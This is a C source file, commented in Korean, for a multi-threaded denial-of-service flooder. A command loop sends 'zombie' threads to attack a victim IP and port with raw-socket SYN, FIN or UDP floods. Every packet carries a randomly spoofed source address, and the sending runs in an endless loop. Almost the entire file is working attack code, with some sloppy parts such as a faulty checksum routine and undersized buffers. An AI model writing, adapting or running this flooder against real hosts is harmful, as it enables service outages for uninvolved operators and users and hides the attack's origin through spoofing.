#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include "sys/types.h"
#include "sys/stat.h"
#include "sys/socket.h"
#include "sys/un.h"

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#define BUFF_SIZE 2048
#define FILE_PATH "/tmp/test_server"

#define MAX_ZOMBIE 32

// 콘솔 글씨색 변경
#define CYAN "\x1b[36m"
#define RED "\x1b[31m"
#define OFF "\x1b[0m"

// 체크섬 계산에 필요한 가상 헤더
struct pseudo_hdr_tcp {
	unsigned int src_addr;
	unsigned int dest_addr;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
};

struct pseudo_hdr_udp {
	unsigned int src_addr;
	unsigned int dest_addr;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short udp_length;
	struct udphdr udp;
};

// 사용자로부터 얻는 기본적인 명령어
struct INSTRUCTION {
	char command_type[7]; // start, stop
	char attack_type[10]; // TCP-SYN, TCP-FIN, UDP
	char addr[20]; // IP address
	int zombie_num; // 좀비일을 할 쓰레드의 수
};

// 사용자의 입력한 정보로 부터 Attacker만을 위한 명령어를 추출
struct INSTRUCTION_DECODE_FOR_ATTACKER {
	char ip_addr[20];
	int port;
	int socket;
	int slave_number;
	int attack_type;
};

// 이 구조체가 전역변수 배열로 선언 댈것이며, 메인 함수가 해당 좀비가 어느 주소를 공격하는지 보고싶다면 이 것을 본다.(메인 함수에서 서브 루틴인 Send_Instruction() 함수가 살펴봄)
struct ATTACK_ADDRESS_OF_ZOMBIE {
	char addr[25];
	char attack_type[10];
};

void Send_Instruction( struct INSTRUCTION instruction );
void *Zombie_Create_And_Connection( void *arg );
void *Zombie( void *arg );
void *TCP_SYN_Attacker( void *arg );
void *TCP_FIN_Attacker( void *arg );
void *UDP_Attacker( void *arg );
unsigned short cksum( unsigned short *addr, int len );
void input_print( void )
{
	printf( CYAN );
	printf( "\n\nFirst field = commad type(start, stop)\n" );
	printf( "Second field = attacking type (TCP-SYN, TCP-FIN, UDP)\n" );
	printf( "Third field = victim's ip address(xxx.xxx.xxx.xxx:port)\n" );
	printf( "Fourth field = number of zombie\n" );
	printf( OFF );

	printf( "Input Commad : " );
}

// 전역 변수 !!
int g_zombie_socket[MAX_ZOMBIE]; // 좀비에게 명령을 보내기 위해 좀비의 해당 인덱스에 해당하는 소켓을 이용한다
pthread_t g_zombie_thread[MAX_ZOMBIE];
int g_busy_zombie_num; // 공격에 가담하고 있는 좀비들의 수
int g_zombie_check[MAX_ZOMBIE]; // 해당 인덱스의 좀비가 가담하고 있는지 아닌지를 판단함. 0이면 놀고있음, 1이면 공격 중 
struct ATTACK_ADDRESS_OF_ZOMBIE g_attack_address_of_zombie[MAX_ZOMBIE]; // 각각 좀비 쓰레드가 어느 주소에 공격을 하는지 기록하는 전역변수

void main()
{
	int status; // pthread_join() 함수의 두번째 인자 여기서 무시해도 되는 변수

	pthread_t server_thread;
	struct INSTRUCTION instruction;

	// 좀비 쓰레드들 생성 및 이들의 통신을 연결하는 쓰레드 만들기
	pthread_create( &server_thread, NULL, Zombie_Create_And_Connection, NULL );
	pthread_join( server_thread, (void*)&status );

	memset( g_zombie_check, 0, sizeof(int)*MAX_ZOMBIE ); // g_zombie_check 변수 초기화

	// 사용자로부터 명령어를 계속적으로 받기
	input_print();
	while(1) {
		memset( &instruction, 0, sizeof(instruction) );
		scanf( "%s %s %s %d", instruction.command_type, instruction.attack_type, instruction.addr, &instruction.zombie_num );
		Send_Instruction( instruction );
	}
}

void Send_Instruction( struct INSTRUCTION instruction )
{
	int i;
	char instruction_tmp[60];
	int current_zombie_num = 0;

	if((g_busy_zombie_num + instruction.zombie_num) > MAX_ZOMBIE) { // 더 이상 일을 시킬 좀비 쓰레드가 없을 때

		printf( "\n현재 이용 가능한 좀비의 수를 넘어 섰습니다 (%d개 만큼 남음)\n", (MAX_ZOMBIE - g_busy_zombie_num) );
		input_print();

		return;
	}
	else {

		// 사용자의 Attack type 입력이 유효한지 확인
		if(strcmp(instruction.attack_type,"TCP-SYN") && strcmp(instruction.attack_type,"UDP") && strcmp(instruction.attack_type,"TCP-FIN")) {
			printf("\nAttack type is not proper\n");
			input_print();

			return;
		}

		// 좀비에게 소켓으로 보낼 명령어를 만든다
		memset( instruction_tmp, 0, 60 );
		strcat( instruction_tmp, instruction.command_type );
		strcat( instruction_tmp, ";" );
		strcat( instruction_tmp, instruction.attack_type );
		strcat( instruction_tmp, ";" );
		strcat( instruction_tmp, instruction.addr );
		strcat( instruction_tmp, ";" );

		// 사용자의 Commad type에 따라 공격을 시작하던가 멈춘다 if(start) else if(stop) else(error)
		if(!strcmp( instruction.command_type, "start" )) { // 사용자의 command_type이 공격을 시작하라고 한다면

			// 사용자가 요구한 zombie_num 만큼 좀비들을 공격에 가담시키기 위해서, 좀비들을 쭉 훑으면서 놀고 있으면 일을 시킨다
			for(i = 0; i < MAX_ZOMBIE; i++) {
				if(g_zombie_check[i] == 0) { // 해당 인덱스의 좀비가 놀고 있다면 공격에 가담시키기

					// 해당 인덱스 전역변수 g_attack_address_of_zombie에 공격 타입과 공격지 주소를 적어 두어서 해당 좀비가 어떤 주소에 공격 하는지 나중에 알 수 있도록 한다
					strcpy( g_attack_address_of_zombie[i].addr, instruction.addr);
					strcpy( g_attack_address_of_zombie[i].attack_type, instruction.attack_type);

					// 소켓으로 만든 명령어 instruction_tmp를 좀비에게 보낸다
					write( g_zombie_socket[i], instruction_tmp, sizeof(instruction_tmp) );
					g_zombie_check[i] = 1;

					printf( RED );
					printf( "[%dth]Zombie start %s attack\n", i, instruction.attack_type );
					printf( OFF );


					current_zombie_num++;
					g_busy_zombie_num++;
					if(current_zombie_num == instruction.zombie_num)
						break;
				}
			}

			input_print();
		}
		else if(!strcmp( instruction.command_type, "stop" )) { // 사용자의 command_type이 공격을 중단하라고 한다면

			// 사용자가 해당 공격을 중단하라고 입력한 명령을 수행하는 좀비를 없애주려 한다
			for(i = 0; i < MAX_ZOMBIE; i++) {
				if(g_zombie_check[i] == 1) { // 일단 공격을 하는

					// 좀비가 사용자가 중단시키려는 곳에 해당 공격을 가하고 있다면
					if(!strcmp( g_attack_address_of_zombie[i].addr, instruction.addr ) && !strcmp( g_attack_address_of_zombie[i].attack_type, instruction.attack_type )) {

						// 소켓으로 만든 명령어 instruction_tmp를 좀비에게 보낸다
						write( g_zombie_socket[i], instruction_tmp, sizeof(instruction_tmp) );
						g_zombie_check[i] = 0;

						// 좀비의 해당 인덱스 전역변수 g_attack_address_of_zombie에 공격 타입과 공격지 주소를 지운다
						memset(&g_attack_address_of_zombie[i],0,sizeof(g_attack_address_of_zombie[i]));

						printf( RED );
						printf( "[%dth]Zombie stop %s attack\n", i, instruction.attack_type );
						printf( OFF );

						current_zombie_num++;
						g_busy_zombie_num--;
						if(current_zombie_num == instruction.zombie_num)
							break;
					}
				}
			}

			input_print();
		}
		else { // 사용자의 command_type이 start 또는 stop이 아닐 경우
			printf( "command_type을 잘못 입력하셨습니다\n" );
			input_print();

			return;
		}
	}
}

void *Zombie_Create_And_Connection(void *arg)
{
	int i;

	// 프로세스 끼리의 통신 UDS http://forum.falinux.com/zbxe/index.php?document_srl=406064&mid=network_programming 참고
	int server_socket;
	int client_socket;
	int client_addr_size;

	// struct sockaddr_un {
	// 	sa_family_t         sun_family; // 주소 체계
	// 	char sun_path[108]; // 경로 이름
	// };
	struct sockaddr_un server_addr;
	struct sockaddr_un client_addr;

	if(access( FILE_PATH, F_OK ) == 0)
		unlink( FILE_PATH );

	server_socket = socket( PF_FILE, SOCK_STREAM, 0);
	if(server_socket == -1) {
		printf( "socket() : server_socket 생성 실패\n" );
		exit( 1 );
	}

	memset( &server_addr, 0, sizeof(server_addr) );
	server_addr.sun_family  = AF_UNIX;
	strcpy( server_addr.sun_path, FILE_PATH ); // 통신에 사용할 파일 이름을 복사
	if( bind( server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr) ) == -1 ) {
		printf( "bind() : 실행 에러\n" );
		exit( 1 );
	}

	// 쓰레드 풀 처럼 좀비들을 만들어 놓고 소켓으로 통신 가능하게 끔 만들기
	for(i = 0; i < MAX_ZOMBIE; i++) {

		pthread_create( &g_zombie_thread[i], NULL, Zombie, NULL );

		if(listen( server_socket, 5 ) == -1) {
			printf( "listen() : 대기상태 모드 설정 실패\n" );
			exit( 1);
		}

		client_addr_size = sizeof(client_addr);
		client_socket = accept( server_socket, (struct sockaddr*)&client_addr, &client_addr_size );
		if(client_socket == -1) {
			printf( "accept() : 클라이언트 연결 수락 실패\n" );
			exit( 1);
		}

		// 전역변수에 해당 좀비와 연락할 클라이언트 소켓을 저장
		g_zombie_socket[i] = client_socket;
	}

	printf( "\n\n좀비 쓰레드들 만들기 완료!!!\n" );
}

void *Zombie(void *arg)
{
	int client_socket;
	struct sockaddr_un server_addr;
	char buff[BUFF_SIZE + 1]; // 사용자가 명령어 입력이 write() 될 때, 해당 되는 좀비는 이를 read() 해가는 데 이때 읽어드린 것을 저장하는 버퍼

	pthread_t attack_thread; // 사용자의 명령어에 따라 해당 공격 쓰레드를 만드는데, 이 쓰레드는 TCP_SYN_Attacker(), TCP_FIN_Attacker(), UDP_Attacker() 중 하나의 함수를 수행한다

	char command_type[7] = {0};
	char attack_type[10] = {0};
	char addr[20] = {0};
	int port = 0;
	struct INSTRUCTION_DECODE_FOR_ATTACKER instruction_decode;

	// 지역변수 instruction_decode 초기화
	memset( &instruction_decode, 0, sizeof(struct INSTRUCTION_DECODE_FOR_ATTACKER) );

	client_socket = socket( PF_FILE, SOCK_STREAM, 0 );
	if(client_socket == -1) {
		printf( "socket() : client_socket 생성 실패\n" );
		return;
	}

	memset( &server_addr, 0, sizeof(server_addr) );
	server_addr.sun_family = AF_UNIX;
	strcpy( server_addr.sun_path, FILE_PATH );
	if(connect( client_socket, (struct sockaddr*)&server_addr, sizeof( server_addr) ) == -1) {
		printf( "connect() : 접속 실패\n" );
		exit( 1 );
	}

	while(1) {

		// 사용자가 명령을 입력하면 Send_Instruction() 함수로 인해 write() 되는데 이 명령을 읽어 들여야 함
		read( client_socket, buff, BUFF_SIZE );

		// read로 읽어온 명령어를 토큰을 이용하여 분리해 내자. 이때 ip주소와 포트를 떼어내기 위해 세미콜론이 아닌 : 이용
		strcpy( command_type, strtok( buff, ";" ) );
		strcpy( attack_type, strtok( NULL, ";" ) );
		strcpy( addr, strtok( NULL, ":" ) );
		port = atoi( strtok( NULL, ";" ) );

		if(!strcmp( command_type, "start" )) { // 공격을 시작하라 하네 !!

			if(!strcmp( attack_type, "TCP-SYN" )) { // TCP-SYN 공격 !!

				instruction_decode.socket = socket( PF_INET, SOCK_RAW, IPPROTO_TCP ); // 헤더를 만들어야 하므로 RAW 소켓으로 만들기
				instruction_decode.port = port;
				strcpy( instruction_decode.ip_addr, addr );

				pthread_create( &attack_thread, NULL, TCP_SYN_Attacker, (void*)&instruction_decode );
			}
			else if(!strcmp( attack_type, "TCP-FIN" )) { // TCP-FIN 공격 !!

				instruction_decode.socket = socket( PF_INET, SOCK_RAW, IPPROTO_TCP ); // 헤더를 만들어야 하므로 RAW 소켓으로 만들기
				instruction_decode.port = port;
				strcpy( instruction_decode.ip_addr, addr );

				pthread_create( &attack_thread, NULL, TCP_FIN_Attacker, (void*)&instruction_decode );
			}
			else if(!strcmp( attack_type, "UDP" )) { // UDP 공격 !!
				instruction_decode.socket = socket( PF_INET, SOCK_RAW, IPPROTO_UDP ); // 헤더를 만들어야 하므로 RAW 소켓으로 만들기
				instruction_decode.port = port;
				strcpy( instruction_decode.ip_addr, addr );

				pthread_create( &attack_thread, NULL, UDP_Attacker, (void*)&instruction_decode );
			}
		}
		else if(!strcmp( command_type, "stop" ))
			pthread_cancel(attack_thread);
		else {
			printf("Zombie thread error ...\n");
			return;
		}
	}
}

void *TCP_SYN_Attacker(void *arg)
{
	int one = 1; // setsockopt() 함수의 네번째 인자로 들어갈 것이며 그냥 참이라는 1을 가지고 있는 변수일 뿐 크게 의미있지 않다

	// 쓰레드가 만들어지면서 해당하는 곳으로 공격하라고 넘어온 인자를 지역변수에 보기 좋게 저장
	struct INSTRUCTION_DECODE_FOR_ATTACKER *instruction_decode = (struct INSTRUCTION_DECODE_FOR_ATTACKER*)arg;
	int socket = instruction_decode->socket;
	int port = instruction_decode->port;

	// 우리가 직접 패킷을 만들것이다 ~!! 일단 datagram[] 배열에 패킷을 만들 준비를 하자
	char datagram[4096];
	struct pseudo_hdr_tcp psh; // 체크섬 계산에서 사용 될 뿐 크게 의미 있지 않다
	struct iphdr *iph = (struct iphdr*)datagram; // IP 헤더가 앞쪽에 있고
	struct tcphdr *tcph = (struct tcphdr*)(datagram + sizeof(struct ip)); // IP 헤더 뒤로 TCP 헤더가 있으니 이렇게 포인터 계산을 하지 !!
	struct sockaddr_in sin;

	// 내 아이피 주소는 사칭해서 보내 보자라는 뜻에서 만든 배열
	char spoof_addr[20]; // first.second.third.fourth << 이렇게 문자열을 만들 예정 물론 xxx.xxx.xxx.xxx 형식으로 만듬
	char first[3];
	char second[3];
	char third[3];
	char fourth[3];

	// 쓰레드가 만들어지면서 해당하는 곳으로 공격하라고 넘어온 인자 중 IP 주소를 지역변수에 보기 좋게 저장
	char addr[20];
	strcpy( addr, instruction_decode->ip_addr );

	// 일단 우리가 직접 배열에다가 작성할 패킷 내용을 초기화
	memset( datagram, 0, 4096 );

	// 사용자가 공격하라고 요구한 곳의 주소와 포트번호를 넣자
	sin.sin_family = AF_INET;
	sin.sin_port = port;
	sin.sin_addr.s_addr = inet_addr( addr );



	/*--------------------------- 헤더 작성 source ip address 사칭은 뒤에서 우선 기본적인 것만 체우자 ---------------------------*/
	// IP 헤더 작성 !!
	iph->ihl = 5; // IP Header Length
	iph->version = 4; // IP Version
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); // 총 40바이트 이다
	iph->id = htons( 777 ); //이 패킷의 ID
	iph->frag_off = 0;
	iph->ttl = 255; // Time To Live
	iph->protocol = IPPROTO_TCP; // Protocol
	// iph->check = 0; // 체크섬을 계산해서 넣어야 하지만 우선 0으로 초기화
	// iph->saddr = inet_addr( "1.2.3.4" ); // source ip address 이니깐 뒤에서 아무렇게 사칭한 IP 주소로 보낼꺼임 우선 그냥 이렇게 초기화
	iph->daddr = sin.sin_addr.s_addr; // destination ip address 여긴 공격당할 놈의 IP 주소를 적자
	
	// TCP 헤더 작성 !!
	tcph->source = htons( 12345 ); // 발신자의 발신 포트
	tcph->dest = htons( (unsigned short)port ); // 수신자의 포트. 공격 대상 포트로 적자
	tcph->seq = 0; // Sequence Number 지정
	tcph->ack_seq = 0; // Acknowlegement Number 지정
	tcph->doff = 5; // offset
	tcph->fin = 0;
	tcph->syn = 1; // SYN flag만 설정한다
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons( 512 ); // 윈도우 사이즈
	// tcph->check = 0; // 우선 체크섬은 0으로 나중에 계산
	tcph->urg_ptr = 0;

	// TCP 체크섬 계산을 위해 가상 헤더 작성 !!
	// psh.src_addr = inet_addr( "1.2.3.4" ); // 사칭한 IP 주소는 뒤에서 ^^ ~ 처리 우선 이렇게 만들기
	psh.dest_addr = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons( sizeof(struct tcphdr) ); // 20 바이트
	/*------------------------------------------------------ 헤더 작성 끝 ------------------------------------------------------*/



	// 직접 헤더의 값을 작성할 수있도록 소켓의 옵션을 변경
	if(setsockopt( socket, IPPROTO_IP, IP_HDRINCL, (char*)&one, sizeof(one) ) < 0) {
		printf ( "setsockopt() : Error!!\n" );
		exit(0);
	}

	// 날 스레드로 생성한 좀비가 날 죽일때까지 계속 공격한다
	while(1) {
		// IP 주소를 랜덤하게 사칭해보자
		memset( spoof_addr, 0, 20 );
		sprintf( first, "%d", rand()%255 );
		sprintf( second, "%d", rand()%255 );
		sprintf( third, "%d" , rand()%255 );
		sprintf( fourth, "%d", rand()%255 );

		strcat( spoof_addr, first );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, second );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, third );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, fourth );

		// 랜덤하게 얻은 사칭한 주소를 넣자
		psh.src_addr = inet_addr( spoof_addr );
		iph->saddr = inet_addr( spoof_addr );

		// TCP의 체크섬을 계산하고 넣자
		memcpy( &psh.tcp, tcph, sizeof(struct tcphdr) ); // TCP 체크섬은 가상 헤더를 이용하므로 이미 가상헤더의 구조체 자체가 체크섬을 계산하게끔 TCP헤더 필드도 가지도록 했다
		tcph->check = cksum( (unsigned short*)&psh, sizeof(struct pseudo_hdr_tcp) );
		// IP의 체크섬을 계산하고 넣자
		iph->check = cksum ( (unsigned short*)datagram, iph->tot_len >> 1 );

		// 공격지로 만든 패킷 발사 !!!!!!!!!!!!!
		if (sendto( socket,datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin) ) < 0) {          
			// printf ("sendto() : Error!!\n");
		}
		else {
			// printf ("Packet Send ~!!\n");
		}
	}
}

void *TCP_FIN_Attacker(void *arg)
{
	int one = 1; // setsockopt() 함수의 네번째 인자로 들어갈 것이며 그냥 참이라는 1을 가지고 있는 변수일 뿐 크게 의미있지 않다

	// 쓰레드가 만들어지면서 해당하는 곳으로 공격하라고 넘어온 인자를 지역변수에 보기 좋게 저장
	struct INSTRUCTION_DECODE_FOR_ATTACKER *instruction_decode = (struct INSTRUCTION_DECODE_FOR_ATTACKER*)arg;
	int socket = instruction_decode->socket;
	int port = instruction_decode->port;

	// 우리가 직접 패킷을 만들것이다 ~!! 일단 datagram[] 배열에 패킷을 만들 준비를 하자
	char datagram[4096];
	struct pseudo_hdr_tcp psh; // 체크섬 계산에서 사용 될 뿐 크게 의미 있지 않다
	struct iphdr *iph = (struct iphdr*)datagram; // IP 헤더가 앞쪽에 있고
	struct tcphdr *tcph = (struct tcphdr*)(datagram + sizeof(struct ip)); // IP 헤더 뒤로 TCP 헤더가 있으니 이렇게 포인터 계산을 하지 !!
	struct sockaddr_in sin;

	// 내 아이피 주소는 사칭해서 보내 보자라는 뜻에서 만든 배열
	char spoof_addr[20]; // first.second.third.fourth << 이렇게 문자열을 만들 예정 물론 xxx.xxx.xxx.xxx 형식으로 만듬
	char first[3];
	char second[3];
	char third[3];
	char fourth[3];

	// 쓰레드가 만들어지면서 해당하는 곳으로 공격하라고 넘어온 인자 중 IP 주소를 지역변수에 보기 좋게 저장
	char addr[20];
	strcpy( addr, instruction_decode->ip_addr );

	// 일단 우리가 직접 배열에다가 작성할 패킷 내용을 초기화
	memset( datagram, 0, 4096 );

	// 사용자가 공격하라고 요구한 곳의 주소와 포트번호를 넣자
	sin.sin_family = AF_INET;
	sin.sin_port = port;
	sin.sin_addr.s_addr = inet_addr( addr );


	/*--------------------------- 헤더 작성 source ip address 사칭은 뒤에서 우선 기본적인 것만 체우자 ---------------------------*/
	// IP 헤더 작성 !!
	iph->ihl = 5; // IP Header Length
	iph->version = 4; // IP Version
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); // 총 40바이트 이다
	iph->id = htons( 777 ); //이 패킷의 ID
	iph->frag_off = 0;
	iph->ttl = 255; // Time To Live
	iph->protocol = IPPROTO_TCP; // Protocol
	// iph->check = 0; // 체크섬을 계산해서 넣어야 하지만 우선 0으로 초기화
	// iph->saddr = inet_addr( "1.2.3.4" ); // source ip address 이니깐 뒤에서 아무렇게 사칭한 IP 주소로 보낼꺼임 우선 그냥 이렇게 초기화
	iph->daddr = sin.sin_addr.s_addr; // destination ip address 여긴 공격당할 놈의 IP 주소를 적자

	// TCP 헤더 작성 !!
	tcph->source = htons( 12345 ); // 발신자의 발신 포트
	tcph->dest = htons( (unsigned short)port ); // 수신자의 포트. 공격 대상 포트로 적자
	tcph->seq = 0; // Sequence Number 지정
	tcph->ack_seq = 0; // Acknowlegement Number 지정
	tcph->doff = 5; // offset
	tcph->fin = 1; // FIN flag만 설정한다
	tcph->syn = 0;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons( 512 ); // 윈도우 사이즈   
	// tcph->check = 0; // 우선 체크섬은 0으로 나중에 계산
	tcph->urg_ptr = 0;

	// TCP 체크섬 계산을 위해 가상 헤더 작성 !!
	// psh.src_addr = inet_addr( "1.2.3.4" ); // 사칭한 IP 주소는 뒤에서 ^^ ~ 처리 우선 이렇게 만들기
	psh.dest_addr = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons( sizeof(struct tcphdr) ); // 20 바이트
	/*------------------------------------------------------ 헤더 작성 끝 ------------------------------------------------------*/


	// 직접 헤더의 값을 작성할 수있도록 소켓의 옵션을 변경
	if(setsockopt( socket, IPPROTO_IP, IP_HDRINCL, (char*)&one, sizeof(one) ) < 0) {
		printf ( "setsockopt() : Error!!\n" );
		exit(0);
	}

	// 날 스레드로 생성한 좀비가 날 죽일때까지 계속 공격한다
	while(1) {
		// IP 주소를 랜덤하게 사칭해보자
		memset( spoof_addr, 0, 20 );
		sprintf( first, "%d", rand()%255 );
		sprintf( second, "%d", rand()%255 );
		sprintf( third, "%d" , rand()%255 );
		sprintf( fourth, "%d", rand()%255 );

		strcat( spoof_addr, first );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, second );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, third );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, fourth );

		// 랜덤하게 얻은 사칭한 주소를 넣자
		psh.src_addr = inet_addr( spoof_addr );
		iph->saddr = inet_addr( spoof_addr );

		// TCP의 체크섬을 계산하고 넣자
		memcpy( &psh.tcp, tcph, sizeof(struct tcphdr) ); // TCP 체크섬은 가상 헤더를 이용하므로 이미 가상헤더의 구조체 자체가 체크섬을 계산하게끔 TCP헤더 필드도 가지도록 했다
		tcph->check = cksum( (unsigned short*)&psh, sizeof(struct pseudo_hdr_tcp) );
		// IP의 체크섬을 계산하고 넣자
		iph->check = cksum ( (unsigned short*)datagram, iph->tot_len >> 1 );

		// 공격지로 만든 패킷 발사 !!!!!!!!!!!!!
		if (sendto( socket,datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin) ) < 0) {          
			// printf ("sendto() : Error!!\n");
		}
		else {
			// printf ("Packet Send ~!!\n");
		}
	}
}

void* UDP_Attacker(void *arg)
{
	int one = 1; // setsockopt() 함수의 네번째 인자로 들어갈 것이며 그냥 참이라는 1을 가지고 있는 변수일 뿐 크게 의미있지 않다

	// 쓰레드가 만들어지면서 해당하는 곳으로 공격하라고 넘어온 인자를 지역변수에 보기 좋게 저장
	struct INSTRUCTION_DECODE_FOR_ATTACKER *instruction_decode = (struct INSTRUCTION_DECODE_FOR_ATTACKER*)arg;
	int socket = instruction_decode->socket;
	int port = instruction_decode->port;

	// 우리가 직접 패킷을 만들것이다 ~!! 일단 datagram[] 배열에 패킷을 만들 준비를 하자
	char datagram[4096];
	struct pseudo_hdr_udp pshu; // 체크섬 계산에서 사용 될 뿐 크게 의미 있지 않다
	struct iphdr *iph = (struct iphdr*)datagram; // IP 헤더가 앞쪽에 있고
	struct udphdr *udph = (struct udphdr*)(datagram + sizeof(struct ip)); // IP 헤더 뒤로 UDP 헤더가 있으니 이렇게 포인터 계산을 하지 !!
	struct sockaddr_in sin;

	// 내 아이피 주소는 사칭해서 보내 보자라는 뜻에서 만든 배열
	char spoof_addr[20]; // first.second.third.fourth << 이렇게 문자열을 만들 예정 물론 xxx.xxx.xxx.xxx 형식으로 만듬
	char first[3];
	char second[3];
	char third[3];
	char fourth[3];

	// 쓰레드가 만들어지면서 해당하는 곳으로 공격하라고 넘어온 인자 중 IP 주소를 지역변수에 보기 좋게 저장
	char addr[20];
	strcpy( addr, instruction_decode->ip_addr );

	// 일단 우리가 직접 배열에다가 작성할 패킷 내용을 초기화
	memset( datagram, 0, 4096 );

	// 사용자가 공격하라고 요구한 곳의 주소와 포트번호를 넣자
	sin.sin_family = AF_INET;
	sin.sin_port = port;
	sin.sin_addr.s_addr = inet_addr( addr );


	/*--------------------------- 헤더 작성 source ip address 사칭은 뒤에서 우선 기본적인 것만 체우자 ---------------------------*/
	// IP 헤더 작성 !!
	iph->ihl = 5; // IP Header Length
	iph->version = 4; // IP Version
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct udphdr);
	iph->id = htons( 777 ); //이 패킷의 ID
	iph->frag_off = 0;
	iph->ttl = 255; // Time To Live
	iph->protocol = IPPROTO_UDP; // Protocol
	// iph->check = 0; // 체크섬을 계산해서 넣어야 하지만 우선 0으로 초기화
	// iph->saddr = inet_addr( "1.2.3.4" ); // source ip address 이니깐 뒤에서 아무렇게 사칭한 IP 주소로 보낼꺼임 우선 그냥 이렇게 초기화
	iph->daddr = sin.sin_addr.s_addr; // destination ip address 여긴 공격당할 놈의 IP 주소를 적자

	// UDP 헤더 작성 !!
	udph->source = htons( 12345 ); // 발신자의 발신 포트
	udph->dest = htons( (unsigned short)port ); // 수신자의 포트. 공격 대상 포트로 적자
	udph->len = htons( sizeof(struct udphdr) );
	// udph->check = 0; // 우선 체크섬은 0으로 나중에 계산

	// UDP 체크섬 계산을 위해 가상 헤더 작성 !!
	// pshu.src_addr = inet_addr( "1.2.3.4" );  // 사칭한 IP 주소는 뒤에서 ^^ ~ 처리 우선 이렇게 만들기   
	pshu.dest_addr = sin.sin_addr.s_addr;
	pshu.placeholder = 0;
	pshu.protocol = IPPROTO_UDP;
	pshu.udp_length = htons( sizeof(struct udphdr) );
	/*------------------------------------------------------ 헤더 작성 끝 ------------------------------------------------------*/


	// 직접 헤더의 값을 작성할 수있도록 소켓의 옵션을 변경
	if(setsockopt( socket, IPPROTO_IP, IP_HDRINCL, (char*)&one, sizeof(one) ) < 0) {
		printf ( "setsockopt() : Error!!\n" );
		exit(0);
	}

	// 날 스레드로 생성한 좀비가 날 죽일때까지 계속 공격한다
	while(1) {
		// IP 주소를 랜덤하게 사칭해보자
		memset( spoof_addr, 0, 20 );
		sprintf( first, "%d", rand()%255 );
		sprintf( second, "%d", rand()%255 );
		sprintf( third, "%d" , rand()%255 );
		sprintf( fourth, "%d", rand()%255 );

		strcat( spoof_addr, first );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, second );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, third );
		strcat( spoof_addr, "." );
		strcat( spoof_addr, fourth );

		// 랜덤하게 얻은 사칭한 주소를 넣자
		pshu.src_addr = inet_addr( spoof_addr );
		iph->saddr = inet_addr( spoof_addr );

		// UDP의 체크섬을 계산하고 넣자
		memcpy( &pshu.udp, udph, sizeof(struct udphdr) ); // UDP 체크섬은 가상 헤더를 이용하므로 이미 가상헤더의 구조체 자체가 체크섬을 계산하게끔 UDP헤더 필드도 가지도록 했다
		udph->check = cksum( (unsigned short*)&pshu, sizeof(struct pseudo_hdr_udp) ); 
		// IP의 체크섬을 계산하고 넣자
		iph->check = cksum ( (unsigned short*)datagram, iph->tot_len >> 1 );

		// 공격지로 만든 패킷 발사 !!!!!!!!!!!!!
		if (sendto( socket,datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin) ) < 0) {          
			// printf ("sendto() : Error!!\n");
		}
		else {
			// printf ("Packet Send ~!!\n");
		}
	}
}

unsigned short cksum(unsigned short *addr,int len)
{
	register long sum = 0;
	unsigned short oddbyte = 0;
	register short answer = 0;

	while(len > 1) {
		sum += (*addr)++;
		len-=2;
	}
	if(len == 1) {
		*((u_char*)&oddbyte) = *(u_char*)addr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;
	return answer;
}
